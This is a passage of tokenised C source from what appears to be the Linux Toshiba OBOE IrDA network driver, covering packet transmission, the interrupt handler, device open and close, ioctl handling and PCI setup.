"only", "a", "timer", ".", "Do", "not", "send", "mtt", "packet", "outside", "!", "*", "/", "toshoboe_start_DMA", "(", "self", ",", "OBOE_CONFIG0H_ENTX", "|", "OBOE_CONFIG0H_LOOP", ")", ";", "self", "-", ">", "txpending", "+", "+;", "self", "-", ">", "txs", "+", "+;", "self", "-", ">", "txs", "%", "=", "TX_SLOTS", ";", "}", "else", "{", "printk", "(", "KERN_ERR", "DRIVER_NAME", "\"", ":", "problem", "with", "mtt", "packet", "-", "ignored", "\\", "n", "\"", ");", "}", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "spinlock", ",", "flags", ")", ";", "}", "#", "ifdef", "DUMP_PACKETS", "dumpbufs", "(", "skb", "-", ">", "data", ",", "skb", "-", ">", "len", ",", "'>", "')", ";", "#", "endif", "spin_lock_irqsave", "(", "&", "self", "-", ">", "spinlock", ",", "flags", ")", ";", "if", "(", "self", "-", ">", "ring", "-", ">", "tx", "[", "self", "-", ">", "txs", "]", ".", "control", "&", "OBOE_CTL_TX_HW_OWNS", ")", "{", "pr_debug", "(", "\"%", "s", ".", "ful", ":", "%", "x", "(", "%", "x", ")", "%", "x", "\\", "n", "\"", ",", "__func__", ",", "skb", "-", ">", "len", ",", "self", "-", ">", "ring", "-", ">", "tx", "[", "self", "-", ">", "txs", "]", ".", "control", ",", "self", "-", ">", "txpending", ")", ";", "toshoboe_start_DMA", "(", "self", ",", "OBOE_CONFIG0H_ENTX", ")", ";", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "spinlock", ",", "flags", ")", ";", "return", "NETDEV_TX_BUSY", ";", "}", "if", "(", "INB", "(", "OBOE_ENABLEH", ")", "&", "OBOE_ENABLEH_SIRON", ")", "{", "len", "=", "async_wrap_skb", "(", "skb", ",", "self", "-", ">", "tx_bufs", "[", "self", "-", ">", "txs", "]", ",", "TX_BUF_SZ", ")", ";", "}", "else", "{", "len", "=", "skb", "-", ">", "len", ";", "skb_copy_from_linear_data", "(", "skb", ",", "self", "-", ">", "tx_bufs", "[", "self", "-", ">", "txs", "]", ",", "len", ")", ";", "}", "self", "-", ">", "ring", "-", ">", "tx", "[", "self", "-", ">", "txs", "]", ".", "len", "=", "len", "&", "0x0fff", ";", "/", "*", "Sometimes", "the", "HW", "doesn", "'", "t", "see", "us", "assert", "RTCENTX", "in", "the", "interrupt", "code", "*", "/", "/", "*", "later", "this", "plays", "safe", ",", "we", "garuntee", "the", "last", "packet", "to", "be", "transmitted", "*", "/", "/", "*", "has", "RTCENTX", "set", "*", "/", "ctl", "=", "OBOE_CTL_TX_HW_OWNS", "|", "OBOE_CTL_TX_RTCENTX", ";", "if", "(", "INB", "(", "OBOE_ENABLEH", ")", "&", "OBOE_ENABLEH_FIRON", ")", "{", "ctl", "|", "=", "OBOE_CTL_TX_SIP", ";", "}", "self", "-", ">", "ring", "-", ">", "tx", "[", "self", "-", ">", "txs", "]", ".", "control", "=", "ctl", ";", "/", "*", "If", "transmitter", "is", "idle", "start", "in", "one", "-", "shot", "mode", "*", "/", "if", "(", "!", "self", "-", ">", "txpending", ")", "toshoboe_start_DMA", "(", "self", ",", "OBOE_CONFIG0H_ENTX", ")", ";", "self", "-", ">", "txpending", "+", "+;", "self", "-", ">", "txs", "+", "+;", "self", "-", ">", "txs", "%", "=", "TX_SLOTS", ";", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "spinlock", ",", "flags", ")", ";", "dev_kfree_skb", "(", "skb", ")", ";", "return", "NETDEV_TX_OK", ";", "}", "/", "*", "interrupt", "handler", "*", "/", "static", "irqreturn_t", "toshoboe_interrupt", "(", "int", "irq", ",", "void", "*", "dev_id", ")", "{", "struct", "toshoboe_cb", "*", "self", "=", "dev_id", ";", "__u8", "irqstat", ";", "struct", "sk_buff", "*", "skb", "=", "NULL", ";", "irqstat", "=", "INB", "(", "OBOE_ISR", ")", ";", "/", "*", "was", "it", "us", "*", "/", "if", "(", "!(", "irqstat", "&", "OBOE_INT_MASK", ")", ")", "return", "IRQ_NONE", ";", "/", "*", "Ack", "all", "the", "interrupts", "*", "/", "OUTB", "(", "irqstat", ",", "OBOE_ISR", ")", ";", "toshoboe_isntstuck", "(", "self", ")", ";", "/", "*", "Txdone", "*", "/", "if", "(", "irqstat", "&", "OBOE_INT_TXDONE", ")", "{", "int", "txp", ",", "txpc", ";", "int", "i", ";", "txp", "=", "self", "-", ">", "txpending", ";", "self", "-", ">", "txpending", "=", "0", ";", "for", "(", "i", "=", "0", ";", "i", "<", "TX_SLOTS", ";", "+", "+", "i", ")", "{", "if", "(", "self", "-", ">", "ring", "-", ">", "tx", "[", "i", "]", ".", "control", "&", "OBOE_CTL_TX_HW_OWNS", ")", "self", "-", ">", "txpending", "+", "+;", "}", "pr_debug", "(", "\"%", "s", ".", "txd", "(", "%", "x", ")", "%", "x", "/", "%", "x", "\\", "n", "\"", ",", "__func__", ",", "irqstat", ",", "txp", ",", "self", "-", ">", "txpending", ")", ";", "txp", "=", "INB", "(", "OBOE_TXSLOT", ")", "&", "OBOE_SLOT_MASK", ";", "/", "*", "Got", "anything", "queued", "?", "start", "it", "together", "*", "/", "if", "(", "self", "-", ">", "ring", "-", ">", "tx", "[", "txp", "]", ".", "control", "&", "OBOE_CTL_TX_HW_OWNS", ")", "{", "txpc", "=", "txp", ";", "#", "ifdef", "OPTIMIZE_TX", "while", "(", "self", "-", ">", "ring", "-", ">", "tx", "[", "txpc", "]", ".", "control", "&", "OBOE_CTL_TX_HW_OWNS", ")", "{", "txp", "=", "txpc", ";", "txpc", "+", "+;", "txpc", "%", "=", "TX_SLOTS", ";", "self", "-", ">", "netdev", "-", ">", "stats", ".", "tx_packets", "+", "+;", "if", "(", "self", "-", ">", "ring", "-", ">", "tx", "[", "txpc", "]", ".", "control", "&", "OBOE_CTL_TX_HW_OWNS", ")", "self", "-", ">", "ring", "-", ">", "tx", "[", "txp", "]", ".", "control", "&", "=", "~", "OBOE_CTL_TX_RTCENTX", ";", "}", "self", "-", ">", "netdev", "-", ">", "stats", ".", "tx_packets", "-", "-;", "#", "else", "self", "-", ">", "netdev", "-", ">", "stats", ".", "tx_packets", "+", "+;", "#", "endif", "toshoboe_start_DMA", "(", "self", ",", "OBOE_CONFIG0H_ENTX", ")", ";", "}", "if", "(", "(!", "self", "-", ">", "txpending", ")", "&", "&", "(", "self", "-", ">", "new_speed", ")", ")", "{", "self", "-", ">", "speed", "=", "self", "-", ">", "new_speed", ";", "pr_debug", "(", "\"%", "s", ":", "Executed", "TxDone", "scheduled", "speed", "change", "%", "d", "\\", "n", "\"", ",", "__func__", ",", "self", "-", ">", "speed", ")", ";", "toshoboe_setbaud", "(", "self", ")", ";", "}", "/", "*", "Tell", "network", "layer", "that", "we", "want", "more", "frames", "*", "/", "if", "(", "!", "self", "-", ">", "new_speed", ")", "netif_wake_queue", "(", "self", "-", ">", "netdev", ")", ";", "}", "if", "(", "irqstat", "&", "OBOE_INT_RXDONE", ")", "{", "while", "(", "!(", "self", "-", ">", "ring", "-", ">", "rx", "[", "self", "-", ">", "rxs", "]", ".", "control", "&", "OBOE_CTL_RX_HW_OWNS", ")", ")", "{", "int", "len", "=", "self", "-", ">", "ring", "-", ">", "rx", "[", "self", "-", ">", "rxs", "]", ".", "len", ";", "skb", "=", "NULL", ";", "pr_debug", "(", "\"%", "s", ".", "rcv", ":", "%", "x", "(", "%", "x", ")", "\\", "n", "\"", ",", "__func__", ",", "len", ",", "self", "-", ">", "ring", "-", ">", "rx", "[", "self", "-", ">", "rxs", "]", ".", "control", ")", ";", "#", "ifdef", "DUMP_PACKETS", "dumpbufs", "(", "self", "-", ">", "rx_bufs", "[", "self", "-", ">", "rxs", "]", ",", "len", ",", "'<", "')", ";", "#", "endif", "if", "(", "self", "-", ">", "ring", "-", ">", "rx", "[", "self", "-", ">", "rxs", "]", ".", "control", "=", "=", "0", ")", "{", "__u8", "enable", "=", "INB", "(", "OBOE_ENABLEH", ")", ";", "/", "*", "In", "SIR", "mode", "we", "need", "to", "check", "the", "CRC", "as", "this", "*", "/", "/", "*", "hasn", "'", "t", "been", "done", "by", "the", "hardware", "*", "/", "if", "(", "enable", "&", "OBOE_ENABLEH_SIRON", ")", "{", "if", "(", "!", "toshoboe_checkfcs", "(", "self", "-", ">", "rx_bufs", "[", "self", "-", ">", "rxs", "]", ",", "len", ")", ")", "len", "=", "0", ";", "/", "*", "Trim", "off", "the", "CRC", "*", "/", "if", "(", "len", ">", "1", ")", "len", "-", "=", "2", ";", "else", "len", "=", "0", ";", "pr_debug", "(", "\"%", "s", ".", "SIR", ":", "%", "x", "(", "%", "x", ")", "\\", "n", "\"", ",", "__func__", ",", "len", ",", "enable", ")", ";", "}", "#", "ifdef", "USE_MIR", "else", "if", "(", "enable", "&", "OBOE_ENABLEH_MIRON", ")", "{", "if", "(", "len", ">", "1", ")", "len", "-", "=", "2", ";", "else", "len", "=", "0", ";", "pr_debug", "(", "\"%", "s", ".", "MIR", ":", "%", "x", "(", "%", "x", ")", "\\", "n", "\"", ",", "__func__", ",", "len", ",", "enable", ")", ";", "}", "#", "endif", "else", "if", "(", "enable", "&", "OBOE_ENABLEH_FIRON", ")", "{", "if", "(", "len", ">", "3", ")", "len", "-", "=", "4", ";", "/", "*", "FIXME", ":", "check", "this", "*", "/", "else", "len", "=", "0", ";", "pr_debug", "(", "\"%", "s", ".", "FIR", ":", "%", "x", "(", "%", "x", ")", "\\", "n", "\"", ",", "__func__", ",", "len", ",", "enable", ")", ";", "}", "else", "pr_debug", "(", "\"%", "s", ".", "?", "IR", ":", "%", "x", "(", "%", "x", ")", "\\", "n", "\"", ",", "__func__", ",", "len", ",", "enable", ")", ";", "if", "(", "len", ")", "{", "skb", "=", "dev_alloc_skb", "(", "len", "+", "1", ")", ";", "if", "(", "skb", ")", "{", "skb_reserve", "(", "skb", ",", "1", ")", ";", "skb_put", "(", "skb", ",", "len", ")", ";", "skb_copy_to_linear_data", "(", "skb", ",", "self", "-", ">", "rx_bufs", "[", "self", "-", ">", "rxs", "]", ",", "len", ")", ";", "self", "-", ">", "netdev", "-", ">", "stats", ".", "rx_packets", "+", "+;", "skb", "-", ">", "dev", "=", "self", "-", ">", "netdev", ";", "skb_reset_mac_header", "(", "skb", ")", ";", "skb", "-", ">", "protocol", "=", "htons", "(", "ETH_P_IRDA", ")", ";", "}", "else", "{", "printk", "(", "KERN_INFO", "\"", "%", "s", "(", "),", "memory", "squeeze", ",", "dropping", "frame", ".", "\\", "n", "\"", ",", "__func__", ")", ";", "}", "}", "}", "else", "{", "/", "*", "TODO", ":", "=", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "*", "/", "/", "*", "if", "OBOE_CTL_RX_LENGTH", ",", "our", "buffers", "are", "too", "small", "*", "/", "/", "*", "(", "MIR", "or", "FIR", ")", "data", "is", "lost", ".", "*", "/", "/", "*", "(", "SIR", ")", "data", "is", "splitted", "in", "several", "slots", ".", "*", "/", "/", "*", "we", "have", "to", "join", "all", "the", "received", "buffers", "received", "*", "/", "/", "*", "in", "a", "large", "buffer", "before", "checking", "CRC", ".", "*", "/", "pr_debug", "(", "\"%", "s", ".", "err", ":", "%", "x", "(", "%", "x", ")", "\\", "n", "\"", ",", "__func__", ",", "len", ",", "self", "-", ">", "ring", "-", ">", "rx", "[", "self", "-", ">", "rxs", "]", ".", "control", ")", ";", "}", "self", "-", ">", "ring", "-", ">", "rx", "[", "self", "-", ">", "rxs", "]", ".", "len", "=", "0x0", ";", "self", "-", ">", "ring", "-", ">", "rx", "[", "self", "-", ">", "rxs", "]", ".", "control", "=", "OBOE_CTL_RX_HW_OWNS", ";", "self", "-", ">", "rxs", "+", "+;", "self", "-", ">", "rxs", "%", "=", "RX_SLOTS", ";", "if", "(", "skb", ")", "netif_rx", "(", "skb", ")", ";", "}", "}", "if", "(", "irqstat", "&", "OBOE_INT_TXUNDER", ")", "{", "printk", "(", "KERN_WARNING", "DRIVER_NAME", "\"", ":", "tx", "fifo", "underflow", "\\", "n", "\"", ");", "}", "if", "(", "irqstat", "&", "OBOE_INT_RXOVER", ")", "{", "printk", "(", "KERN_WARNING", "DRIVER_NAME", "\"", ":", "rx", "fifo", "overflow", "\\", "n", "\"", ");", "}", "/", "*", "This", "must", "be", "useful", "for", "something", ".", "..", "*", "/", "if", "(", "irqstat", "&", "OBOE_INT_SIP", ")", "{", "self", "-", ">", "int_sip", "+", "+;", "pr_debug", "(", "\"%", "s", ".", "sip", ":", "%", "x", "(", "%", "x", ")", "%", "x", "\\", "n", "\"", ",", "__func__", ",", "self", "-", ">", "int_sip", ",", "irqstat", ",", "self", "-", ">", "txpending", ")", ";", "}", "return", "IRQ_HANDLED", ";", "}", "static", "int", "toshoboe_net_open", "(", "struct", "net_device", "*", "dev", ")", "{", "struct", "toshoboe_cb", "*", "self", ";", "unsigned", "long", "flags", ";", "int", "rc", ";", "self", "=", "netdev_priv", "(", "dev", ")", ";", "if", "(", "self", "-", ">", "async", ")", "return", "-", "EBUSY", ";", "if", "(", "self", "-", ">", "stopped", ")", "return", "0", ";", "rc", "=", "request_irq", "(", "self", "-", ">", "io", ".", "irq", ",", "toshoboe_interrupt", ",", "IRQF_SHARED", ",", "dev", "-", ">", "name", ",", "self", ")", ";", "if", "(", "rc", ")", "return", "rc", ";", "spin_lock_irqsave", "(", "&", "self", "-", ">", "spinlock", ",", "flags", ")", ";", "toshoboe_startchip", "(", "self", ")", ";", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "spinlock", ",", "flags", ")", ";", "/", "*", "Ready", "to", "play", "!", "*", "/", "netif_start_queue", "(", "dev", ")", ";", "/", "*", "*", "Open", "new", "IrLAP", "layer", "instance", ",", "now", "that", "everything", "should", "be", "*", "initialized", "properly", "*", "/", "self", "-", ">", "irlap", "=", "irlap_open", "(", "dev", ",", "&", "self", "-", ">", "qos", ",", "driver_name", ")", ";", "self", "-", ">", "irdad", "=", "1", ";", "return", "0", ";", "}", "static", "int", "toshoboe_net_close", "(", "struct", "net_device", "*", "dev", ")", "{", "struct", "toshoboe_cb", "*", "self", ";", "IRDA_ASSERT", "(", "dev", "!", "=", "NULL", ",", "return", "-", "1", ";", ")", ";", "self", "=", "netdev_priv", "(", "dev", ")", ";", "/", "*", "Stop", "device", "*", "/", "netif_stop_queue", "(", "dev", ")", ";", "/", "*", "Stop", "and", "remove", "instance", "of", "IrLAP", "*", "/", "if", "(", "self", "-", ">", "irlap", ")", "irlap_close", "(", "self", "-", ">", "irlap", ")", ";", "self", "-", ">", "irlap", "=", "NULL", ";", "self", "-", ">", "irdad", "=", "0", ";", "free_irq", "(", "self", "-", ">", "io", ".", "irq", ",", "(", "void", "*", ")", "self", ")", ";", "if", "(", "!", "self", "-", ">", "stopped", ")", "{", "toshoboe_stopchip", "(", "self", ")", ";", "}", "return", "0", ";", "}", "/", "*", "*", "Function", "toshoboe_net_ioctl", "(", "dev", ",", "rq", ",", "cmd", ")", "*", "*", "Process", "IOCTL", "commands", "for", "this", "device", "*", "*", "/", "static", "int", "toshoboe_net_ioctl", "(", "struct", "net_device", "*", "dev", ",", "struct", "ifreq", "*", "rq", ",", "int", "cmd", ")", "{", "struct", "if_irda_req", "*", "irq", "=", "(", "struct", "if_irda_req", "*", ")", "rq", ";", "struct", "toshoboe_cb", "*", "self", ";", "unsigned", "long", "flags", ";", "int", "ret", "=", "0", ";", "IRDA_ASSERT", "(", "dev", "!", "=", "NULL", ",", "return", "-", "1", ";", ")", ";", "self", "=", "netdev_priv", "(", "dev", ")", ";", "IRDA_ASSERT", "(", "self", "!", "=", "NULL", ",", "return", "-", "1", ";", ")", ";", "pr_debug", "(", "\"%", "s", "(", "),", "%", "s", ",", "(", "cmd", "=", "0x", "%", "X", ")", "\\", "n", "\"", ",", "__func__", ",", "dev", "-", ">", "name", ",", "cmd", ")", ";", "/", "*", "Disable", "interrupts", "&", "save", "flags", "*", "/", "spin_lock_irqsave", "(", "&", "self", "-", ">", "spinlock", ",", "flags", ")", ";", "switch", "(", "cmd", ")", "{", "case", "SIOCSBANDWIDTH", ":", "/", "*", "Set", "bandwidth", "*", "/", "/", "*", "This", "function", "will", "also", "be", "used", "by", "IrLAP", "to", "change", "the", "*", "speed", ",", "so", "we", "still", "must", "allow", "for", "speed", "change", "within", "*", "interrupt", "context", ".", "*", "/", "pr_debug", "(", "\"%", "s", "(", "BANDWIDTH", ")", ",", "%", "s", ",", "(", "%", "X", "/", "%", "ld", "\\", "n", "\"", ",", "__func__", ",", "dev", "-", ">", "name", ",", "INB", "(", "OBOE_STATUS", ")", ",", "irq", "-", ">", "ifr_baudrate", ")", ";", "if", "(", "!", "in_interrupt", "(", ")", "&", "&", "!", "capable", "(", "CAP_NET_ADMIN", ")", ")", "{", "ret", "=", "-", "EPERM", ";", "goto", "out", ";", "}", "/", "*", "self", "-", ">", "speed", "=", "irq", "-", ">", "ifr_baudrate", ";", "*", "/", "/", "*", "toshoboe_setbaud", "(", "self", ")", ";", "*", "/", "/", "*", "Just", "change", "speed", "once", "-", "inserted", "by", "Paul", "Bristow", "*", "/", "self", "-", ">", "new_speed", "=", "irq", "-", ">", "ifr_baudrate", ";", "break", ";", "case", "SIOCSMEDIABUSY", ":", "/", "*", "Set", "media", "busy", "*", "/", "pr_debug", "(", "\"%", "s", "(", "MEDIABUSY", ")", ",", "%", "s", ",", "(", "%", "X", "/", "%", "x", ")", "\\", "n", "\"", ",", "__func__", ",", "dev", "-", ">", "name", ",", "INB", "(", "OBOE_STATUS", ")", ",", "capable", "(", "CAP_NET_ADMIN", ")", ");", "if", "(", "!", "capable", "(", "CAP_NET_ADMIN", ")", ")", "{", "ret", "=", "-", "EPERM", ";", "goto", "out", ";", "}", "irda_device_set_media_busy", "(", "self", "-", ">", "netdev", ",", "TRUE", ")", ";", "break", ";", "case", "SIOCGRECEIVING", ":", "/", "*", "Check", "if", "we", "are", "receiving", "right", "now", "*", "/", "irq", "-", ">", "ifr_receiving", "=", "(", "INB", "(", "OBOE_STATUS", ")", "&", "OBOE_STATUS_RXBUSY", ")", "?", "1", ":", "0", ";", "pr_debug", "(", "\"%", "s", "(", "RECEIVING", ")", ",", "%", "s", ",", "(", "%", "X", "/", "%", "x", ")", "\\", "n", "\"", ",", "__func__", ",", "dev", "-", ">", "name", ",", "INB", "(", "OBOE_STATUS", ")", ",", "irq", "-", ">", "ifr_receiving", ")", ";", "break", ";", "default", ":", "pr_debug", "(", "\"%", "s", "(", "?)", ",", "%", "s", ",", "(", "cmd", "=", "0x", "%", "X", ")", "\\", "n", "\"", ",", "__func__", ",", "dev", "-", ">", "name", ",", "cmd", ")", ";", "ret", "=", "-", "EOPNOTSUPP", ";", "}", "out", ":", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "spinlock", ",", "flags", ")", ";", "return", "ret", ";", "}", "MODULE_DESCRIPTION", "(", "\"", "Toshiba", "OBOE", "IrDA", "Device", "Driver", "\"", ");", "MODULE_AUTHOR", "(", "\"", "James", "McKenzie", "<", "james", "@", "fishsoup", ".", "dhs", ".", "org", ">", "\")", ";", "MODULE_LICENSE", "(", "\"", "GPL", "\"", ");", "module_param", "(", "max_baud", ",", "int", ",", "0", ")", ";", "MODULE_PARM_DESC", "(", "max_baud", ",", "\"", "Maximum", "baud", "rate", "\"", ");", "#", "ifdef", "USE_PROBE", "module_param", "(", "do_probe", ",", "bool", ",", "0", ")", ";", "MODULE_PARM_DESC", "(", "do_probe", ",", "\"", "Enable", "/", "disable", "chip", "probing", "and", "self", "-", "test", "\"", ");", "#", "endif", "static", "void", "toshoboe_close", "(", "struct", "pci_dev", "*", "pci_dev", ")", "{", "int", "i", ";", "struct", "toshoboe_cb", "*", "self", "=", "pci_get_drvdata", "(", "pci_dev", ")", ";", "IRDA_ASSERT", "(", "self", "!", "=", "NULL", ",", "return", ";", ")", ";", "if", "(", "!", "self", "-", ">", "stopped", ")", "{", "toshoboe_stopchip", "(", "self", ")", ";", "}", "release_region", "(", "self", "-", ">", "io", ".", "fir_base", ",", "self", "-", ">", "io", ".", "fir_ext", ")", ";", "for", "(", "i", "=", "0", ";", "i", "<", "TX_SLOTS", ";", "+", "+", "i", ")", "{", "kfree", "(", "self", "-", ">", "tx_bufs", "[", "i", "]", ");", "self", "-", ">", "tx_bufs", "[", "i", "]", "=", "NULL", ";", "}", "for", "(", "i", "=", "0", ";", "i", "<", "RX_SLOTS", ";", "+", "+", "i", ")", "{", "kfree", "(", "self", "-", ">", "rx_bufs", "[", "i", "]", ");", "self", "-", ">", "rx_bufs", "[", "i", "]", "=", "NULL", ";", "}", "unregister_netdev", "(", "self", "-", ">", "netdev", ")", ";", "kfree", "(", "self", "-", ">", "ringbuf", ")", ";", "self", "-", ">", "ringbuf", "=", "NULL", ";", "self", "-", ">", "ring", "=", "NULL", ";", "free_netdev", "(", "self", "-", ">", "netdev", ")", ";", "}", "static", "const", "struct", "net_device_ops", "toshoboe_netdev_ops", "=", "{", ".", "ndo_open", "=", "toshoboe_net_open", ",", ".", "ndo_stop", "=", "toshoboe_net_close", ",", ".", "ndo_start_xmit", "=", "toshoboe_hard_xmit", ",", ".", "ndo_do_ioctl", "=", "toshoboe_net_ioctl", ",", "}", ";", "static", "int", "toshoboe_open", "(", "struct", "pci_dev", "*", "pci_dev", ",", "const", "struct", "pci_device_id", "*", "pdid", ")", "{", "struct", "toshoboe_cb", "*", "self", ";", "struct", "net_device", "*", "dev", ";", "int", "i", "=", "0", ";", "int", "ok", "=", "0", ";", "int", "err", ";", "if", "(", "(", "err", "=", "pci_enable_device", "(", "pci_dev", ")", "))", "return", "err", ";", "dev", "=", "alloc_irdadev", "(", "sizeof", "(", "struct", "toshoboe_cb", ")", ");", "if", "(", "dev", "=", "=", "NULL", ")", "{", "printk", "(", "KERN_ERR", "DRIVER_NAME", "\"", ":", "can", "'", "t", "allocate", "memory", "for", "\"", "\"", "IrDA", "control", "block", "\\", "n", "\"", ");", "return", "-", "ENOMEM", ";", "}", "self", "=", "netdev_priv", "(", "dev", ")", ";", "self", "-", ">", "netdev", "=", "dev", ";", "self", "-", ">", "pdev", "=", "pci_dev", ";", "self", "-", ">", "base", "=", "pci_resource_start", "(", "pci_dev", ",", "0", ")", ";", "self", "-", ">", "io", ".", "fir_base", "=", "self", "-", ">", "base", ";", "self", "-", ">", "io", ".", "fir_ext", "=", "OBOE_IO_EXTENT", ";", "self", "-", ">", "io", ".", "irq", "=", "pci_dev", "-", ">", "irq", ";", "self", "-", ">", "io", ".", "irqflags", "=", "IRQF_SHARED", ";", "self", "-", ">", "speed", "=", "self", "-", ">", "io", ".", "speed", "=", "9600", ";", "self", "-", ">", "async", "=", "0", ";", "/", "*", "Lock", "the", "port", "that", "we", "need", "*", "/", "if", "(", "NULL", "=", "=", "request_region", "(", "self", "-", ">", "io", ".", "fir_base", ",", "self", "-", ">", "io", ".", "fir_ext", ",", "driver_name", ")", ")", "{", "printk", "(", "KERN_ERR", "DRIVER_NAME", "\"", ":", "can", "'", "t", "get", "iobase", "of", "0x", "%", "03x", "\\", "n", "\"", ",", "self", "-", ">", "io", ".", "fir_base", ")", ";", "err", "=", "-", "EBUSY", ";", "goto", "freeself", ";", "}", "spin_lock_init", "(", "&", "self", "-", ">", "spinlock", ")", ";", "irda_init_max_qos_capabilies", "(", "&", "self", "-", ">", "qos", ")", ";", "self", "-", ">", "qos", ".", "baud_rate", ".", "bits", "=", "0", ";", "if", "(", "max_baud", ">", "=", "2400", ")", "self", "-", ">", "qos", ".", "baud_rate", ".", "bits", "|", "=", "IR_2400", ";", "/", "*", "if", "(", "max_baud", ">", "=", "4800", ")", "idev", "-", ">", "qos", ".", "baud_rate", ".", "bits", "|", "=", "IR_4800", ";", "*", "/", "if", "(", "max_baud", ">", "=", "9600", ")", "self", "-", ">", "qos", ".", "baud_rate", ".", "bits", "|", "=", "IR_9600", ";", "if", "(", "max_baud", ">", "=", "19200", ")", "self", "-", ">", "qos", ".", "baud_rate", ".", "bits", "|", "=", "IR_19200", ";", "if", "(", "max_baud", ">", "=", "115200", ")", "self", "-", ">", "qos", ".", "baud_rate", ".", "bits", "|", "=", "IR_115200", ";", "#", "ifdef", "USE_MIR", "if", "(", "max_baud", ">", "=", "1152000", ")", "{", "self", "-", ">", "qos", ".", "baud_rate", ".", "bits", "|", "=", "IR_1152000", ";", "}", "#", "endif", "if", "(", "max_baud", ">", "=", "4000000", ")", "{", "self", "-", ">", "qos", ".", "baud_rate", ".", "bits", "|", "=", "(", "IR_4000000", "<", "<", "8", ")", ";", "}", "/", "*", "FIXME", ":", "work", "this", "out", ".", "..", "*", "/", "self", "-", ">", "qos", ".", "min_turn_time", ".", "bits", "=", "0xff", ";", "irda_qos_bits_to_value", "(", "&", "self", "-", ">", "qos", ")", ";", "/", "*", "Allocate", "twice", "the", "size", "to", "guarantee", "alignment", "*", "/", "self", "-", ">", "ringbuf", "=", "kmalloc", "(", "OBOE_RING_LEN", "<", "<", "1", ",", "GFP_KERNEL", ")", ";", "if", "(", "!", "self", "-", ">", "ringbuf", ")", "{", "err", "=", "-", "ENOMEM", ";", "goto", "freeregion", ";", "}", "#", "if", "(", "BITS_PER_LONG", "=", "=", "64", ")", "#", "error", "broken", "on", "64", "-", "bit", ":", "casts", "pointer", "to", "32", "-", "bit", ",", "and", "then", "back", "to", "pointer", ".", "#", "endif", "/", "*", "We", "need", "to", "align", "the", "taskfile", "on", "a", "taskfile", "size", "boundary", "*", "/", "{", "unsigned", "long", "addr", ";", "addr", "=", "(", "__u32", ")", "self", "-", ">", "ringbuf", ";", "addr", "&", "=", "~", "(", "OBOE_RING_LEN", "-", "1", ")", ";", "addr", "+", "=", "OBOE_RING_LEN", ";", "self", "-", ">", "ring", "=", "(", "struct", "OboeRing", "*", ")", "addr", ";", "}", "memset", "(", "self", "-", ">", "ring", ",", "0", ",", "OBOE_RING_LEN", ")", ";", "self", "-", ">", "io", ".", "mem_base", "=", "(", "__u32", ")", "self", "-", ">", "ring", ";", "ok", "=", "1", ";", "for", "(", "i", "=", "0", ";", "i", "<", "TX_SLOTS", ";", "+", "+", "i", ")", "{", "self", "-", ">", "tx_bufs", "[", "i", "]", "=", "kmalloc", "(", "TX_BUF_SZ", ",", "GFP_KERNEL", ")", ";", "if", "(", "!", "self", "-", ">", "tx_bufs", "[", "i", "]", ")", "ok", "=", "0", ";", "}", "for", "(", "i", "=", "0", ";", "i", "<", "RX_SLOTS", ";", "+", "+", "i", ")", "{", "self", "-", ">", "rx_bufs", "[", "i", "]", "=", "kmalloc", "(", "RX_BUF_SZ", ",", "GFP_KERNEL", ")", ";", "if", "(", "!", "self", "-", ">", "rx_bufs", "[", "i", "]", ")", "ok", "=", "0", ";", "}", "if", "(", "!", "ok", ")", "{", "err", "=", "-", "ENOMEM", ";", "goto", "freebufs", ";", "}", "#", "ifdef", "USE_PROBE", "if", "(", "do_probe", ")", "if", "(", "!", "toshoboe_probe", "(", "self", ")", ")", "{", "err", "=", "-", "ENODEV", ";", "goto", "freebufs", ";", "}", "#", "endif", "SET_NETDEV_DEV", "(", "dev", ",", "&", "pci_dev", "-", ">", "dev", ")", ";", "dev", "-", ">", "netdev_ops", "=", "&", "toshoboe_netdev_ops", ";", "err", "=", "register_netdev", "(", "dev", ")", ";", "if", "(", "err", ")", "{", "printk", "(", "KERN_ERR", "DRIVER_NAME", "\"", ":", "register_netdev", "(", ")", "failed", "\\", "n", "\"", ");", "err", "=", "-", "ENOMEM", ";", "goto", "freebufs", ";", "}", "printk", "(", "KERN_INFO", "\"", "IrDA", ":", "Registered", "device", "%", "s", "\\", "n", "\"", ",", "dev", "-", ">", "name", ")", ";", "pci_set_drvdata", "(", "pci_dev", ",", "self", ")", ";", "printk", "(", "KERN_INFO", "DRIVER_NAME", "\"", ":", "Using", "multiple", "tasks", "\\", "n", "\"", ");", "return", "0", ";", "freebufs", ":", "for", "(", "i", "=", "0", ";", "i", "<", "TX_SLOTS", ";", "+", "+", "i", ")", "kfree", "(", "self", "-", ">", "tx_bufs", "[", "i", "]", ");", "for", "(", "i", "=", "0", ";", "i", "<", "RX_SLOTS", ";", "+", "+", "i", ")", "kfree", "(", "self", "-", ">", "rx_bufs", "[", "i", "]", ");", "kfree", "(", "self", "-", ">", "ringbuf", ")", ";", "freeregion", ":", "release_region", "(", "self", "-", ">", "io", ".", "fir_base", ",", "self", "-", ">", "io", ".", "fir_ext", ")", ";", "freeself", ":", "free_netdev", "(", "dev", ")", ";", "return", "err", ";", "}", "static", "int", "toshoboe_gotosleep", "(", "struct", "pci_dev", "*", "pci_dev", ",", "pm_message_t", "crap", ")", "{", "struct", "toshoboe_cb", "*", "self", "=", "pci_get_drvdata", "(", "pci_dev", ")", ";", "unsigned", "long", "flags", ";", "int", "i", "=", "10", ";", "if", "(", "!", "self", "|", "|", "self", "-", ">", "stopped", ")", "return", "0", ";", "if", "(", "(!", "self", "-", ">", "irdad", ")", "&", "&", "(", "!", "self", "-", ">", "async", ")", ")", "return", "0", ";", "/", "*", "Flush", "all", "packets", "*", "/", "while", "(", "(", "i", "-", "-)", "&", "&", "(", "self", "-", ">", "txpending", ")", ")", "msleep", "(", "10", ")", ";", "spin_lock_irqsave", "(", "&", "self", "-", ">", "spinlock", ",", "flags", ")", ";", "toshoboe_stopchip", "(", "self", ")", ";", "self", "-", ">", "stopped", "=", "1", ";", "self", "-", ">", "txpending", "=", "0", ";", "spin_unlock_irqrestore", "(", "&", "self", "-", ">", "spinlock", ",", "flags", ")", ";", "return", "0", ";", "}", "static", "int", "toshoboe_wakeup", "(", "struct", "pci_dev", "*", "pci_dev", ")", "{", "struct", "toshoboe_cb", "*", 